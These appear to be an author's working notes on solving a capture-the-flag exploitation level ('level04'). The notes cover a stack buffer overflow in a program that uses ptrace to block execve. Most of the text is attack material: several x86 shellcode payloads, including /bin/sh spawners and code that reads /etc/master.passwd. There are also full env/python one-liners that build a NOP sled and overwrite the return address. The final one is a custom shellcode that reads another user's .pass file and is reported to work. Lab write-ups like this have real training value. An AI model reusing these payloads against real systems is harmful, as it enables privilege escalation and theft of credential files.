We can try shellcode into the child, but we probably won't have access to the terminal, but we can try
a custom shecode that just cat the .pass
sh -c "cat /home/users/level04/.pass"

sheellcode env start address: 0xffffdb8c
+ 500 = 0xFFFFDD80

since we cannot debug using gdb, just mass print 0xFFFFDD80 and see if it works

env -i SHELL="/bin/bash" PWD="$HOME" SHELLCODE="$(python -c 'print "\x90"*1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')" ./level04 < <(python -c 'print "\x80\xdd\xff\xff"*42')

42 gives "no sheellcodee for you"
but 39 does a strange behavior
now try with sheellcode that only does cat

based on this:
https://shell-storm.org/shellcode/files/shellcode-99.html

\x31\xc0\x50\x50\xb0\x17\xcd\x80\xeb\x1f\x5e\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x56\x53\x89\xe2\x50\x52\x53\xb0\x3b\x50\xcd\x80\x50\x50\xcd\x80\xe8\xdc\xff\xff\xff\x2f\x65\x74\x63\x2f\x6d\x61\x73\x74\x65\x72\x2e\x70\x61\x73\x73\x77\x64


\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80

env -i SHELL="/bin/bash" PWD="$HOME" SHELLCODE="$(python -c 'print "\x90"*1000 + "\x31\xc0\x50\x50\xb0\x17\xcd\x80\xeb\x1f\x5e\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x56\x53\x89\xe2\x50\x52\x53\xb0\x3b\x50\xcd\x80\x50\x50\xcd\x80\xe8\xdc\xff\xff\xff\x2f\x65\x74\x63\x2f\x6d\x61\x73\x74\x65\x72\x2e\x70\x61\x73\x73\x77\x64"')" ./level04 < <(python -c 'print "\x80\xdd\xff\xff"*39')

buffer starts at 0xffffd650
ret is at 0xffffd6ec

we need 0x9c (156) to reach EIP save, then shellcode address
"A"*156 + "\x80\xdd\xff\xff"

when running, we need to do ./level4 < <(python -c 'print <blabla>'; cat) UPDATE: nope it causess SIGTTIN, so we need to find a way to write the hex manually without a script
otherwise if the script closes the stdin it seems to interupt and program prints (child is exiting...) then exits, but with cat it doesn't (just like if we wrote ourselves)


env -i SHELL="/bin/bash" PWD="$HOME" SHELLCODE="$(python -c 'print "\x90"*1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')" ./level04 < <(python -c 'print "A"*156 + "\x80\xdd\xff\xff"')
(this is wih the previous shellcode)
executing this, we get the "no exec() for you"

the ptrace word read seems to correspond to eax, when debugging in shellcode in child, right before the last 0x80 (execve), we can see that eax = 0xb
more specifically we can see 'mov al, 0xb' this is most likely the register that ptrace checks, it is used as the syscall number
https://syscalls32.paolostivanin.com/
we can see that 0xb (11) is execve, so the program prevents us from using execve syscall
On the same website, we can see that there is a code for open and a call for write
so we can try to just open the .pass file and print it

https://shell-storm.org/shellcode/files/shellcode-878.html
We just replace the /etc/passwdA (located right at the end of shellcode) to /home/users/level05/.passA (the A will be replaced by NULL)

which gives:
eb3f5f80770b414831c004024831f60f056681ecff0f488d34244889c74831d266baff0f4831c00f054831ff4080c7014889c24831c004010f054831c0043c0f05e8bcffffff eb3f5f80770b414831c004024831f60f056681ecff0f488d34244889c74831d266baff0f4831c00f054831ff4080c7014889c24831c004010f054831c0043c0f05e8bcffffff 2F 68 6F 6D 65 2F 75 73 65 72 73 2F 6C 65 76 65 6C 30 35 2F 2E 70 61 73 73  41

"\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x68\x6f\x6d\x65\x2f\x75\x73\x65\x72\x73\x2f\x6c\x65\x76\x65\x6c\x30\x35\x2f\x2E\x70\x61\x73\x73\x41"
first we try it in c on the VM to see if it works (with level04 pass)
it doesn't work, but after trying the old one it doesn't work either, so try this one anyway with script and see if it works

env -i SHELL="/bin/bash" PWD="$HOME" SHELLCODE="$(python -c 'print "\x90"*1000 + "\x48\x31\xc0\xb0\x02\x48\x31\xff\xbb\x73\x77\x64\x00\x53\x48\xbb\x2f\x65\x74\x63\x70\x61\x73\x53\x48\x8d\x3c\x24\x48\x31\xf6\x0f\x05\x48\x89\xc3\x48\x31\xc0\x48\x89\xdf\x48\x89\xe6\x66\xba\xff\xff\x0f\x05\x49\x89\xc0\x48\x89\xe0\x48\x31\xdb\x53\xbb\x66\x69\x6c\x65\x53\x48\xbb\x2f\x74\x6d\x70\x6f\x75\x74\x53\x48\x89\xc3\x48\x31\xc0\xb0\x02\x48\x8d\x3c\x24\x48\x31\xf6\x6a\x66\x66\x5e\x0f\x05\x48\x89\xc7\x48\x31\xc0\xb0\x01\x48\x8d\x33\x48\x31\xd2\x4c\x89\xc2\x0f\x05"')" ./level04 < <(python -c 'print "A"*156 + "\x80\xdd\xff\xff"')


see this one:
https://shell-storm.org/shellcode/files/shellcode-73.html

\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/etc/passwd

we need to push "/home/users/level04/.pass" on the stack by groups of 4:

70 61 73 73
30 34 2F 2E
65 76 65 6C
72 73 2F 6C
2F 75 73 65
68 6F 6D 65
2F 2F 2F 2F

since it's not odd we can add slashes (2f)
then add \x68 before since it's the push instruction
after that we should mov esp into ebx (argument)

so:
68 70 61 73 73
68 30 34 2F 2E
68 65 76 65 6C
68 72 73 2F 6C
68 2F 75 73 65
68 68 6F 6D 65
68 2F 2F 2F 2F
89 e3

https://defuse.ca/online-x86-assembler.htm#disassembly2
we need to change pop ebx because now we push

"\x68\x70\x61\x73\x73"
"\x68\x30\x34\x2F\x2E"
"\x68\x65\x76\x65\x6C"
"\x68\x72\x73\x2F\x6C"
"\x68\x2F\x75\x73\x65"
"\x68\x68\x6F\x6D\x65"
"\x68\x2F\x2F\x2F\x2F"
"\x89\xe3"

shellcode is :


"\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
"\xeb\x32\x90\xb0\x05\x31\xc9\xcd"
"\x80\x89\xc6\xeb\x06\xb0\x01\x31"
"\xdb\xcd\x80\x89\xf3\xb0\x03\x83"
"\xec\x01\x8d\x0c\x24\xb2\x01\xcd"
"\x80\x31\xdb\x39\xc3\x74\xe6\xb0"
"\x04\xb3\x01\xb2\x01\xcd\x80\x83"
"\xc4\x01\xeb\xdf"
"\x68\x70\x61\x73\x73"
"\x68\x30\x34\x2F\x2E"
"\x68\x65\x76\x65\x6C"
"\x68\x72\x73\x2F\x6C"
"\x68\x2F\x75\x73\x65"
"\x68\x68\x6F\x6D\x65"
"\x68\x2F\x2F\x2F\x2F"
"\x89\xe3"
"\xe8\xa4\xff\xff\xff"

after a lot of trouble, we decide to write our own shellcode
"\x31\xC0\x31\xC9\x31\xD2\x6A\x73\x68\x2E\x70\x61\x73\x68\x6C\x30\x34\x2F\x68\x6C\x65\x76\x65\x68\x65\x72\x73\x2F\x68\x65\x2F\x75\x73\x68\x2F\x68\x6F\x6D\x89\xE3\xB0\x05\xCD\x80\x89\xC3\x31\xC0\x89\xE1\xBA\x28\x00\x00\x00\xB0\x03\xCD\x80\x89\xC2\x89\xE1\xBB\x01\x00\x00\x00\xB0\x04\xCD\x80\xBB\x08\x00\x00\x00\xB0\x01\xCD\x80"
after a lot of time and debug, we have a working shellcode with level04 flag, now try with level05 and inject it:

"\x31\xC0\x31\xC9\x31\xD2\x6A\x73\x68\x2E\x70\x61\x73\x68\x6C\x30\x35\x2F\x68\x6C\x65\x76\x65\x68\x65\x72\x73\x2F\x68\x65\x2F\x75\x73\x68\x2F\x68\x6F\x6D\x89\xE3\xB0\x05\xCD\x80\x89\xC3\x31\xC0\x89\xE1\xBA\x28\x00\x00\x00\xB0\x03\xCD\x80\x89\xC2\x89\xE1\xBB\x01\x00\x00\x00\xB0\x04\xCD\x80\xBB\x08\x00\x00\x00\xB0\x01\xCD\x80"

So it seems that null bytes are removed by gets or something like that, switching 'mov edx, 0x28' (which would do like 00 00 00 28) to 'xor edx,edx ; add edx, 0x28' works, so we get this:
env -i SHELL="/bin/bash" PWD="$HOME" SHELLCODE="$(python -c 'print "\x90"*1000 + "\x31\xC0\x31\xC9\x31\xD2\x6A\x73\x68\x2E\x70\x61\x73\x68\x6C\x30\x35\x2F\x68\x6C\x65\x76\x65\x68\x65\x72\x73\x2F\x68\x65\x2F\x75\x73\x68\x2F\x68\x6F\x6D\x89\xE3\xB0\x05\xCD\x80\x89\xC3\x31\xC0\x89\xE1\x31\xD2\x83\xC2\x28\xB0\x03\xCD\x80\x89\xC2\x89\xE1\x31\xDB\x83\xC3\x01\xB0\x04\xCD\x80\x31\xDB\x83\xC3\x08\xB0\x01\xCD\x80"')" ./level04 < <(python -c 'print "A"*156 + "\x80\xdd\xff\xff"')

and it prints the flag successfully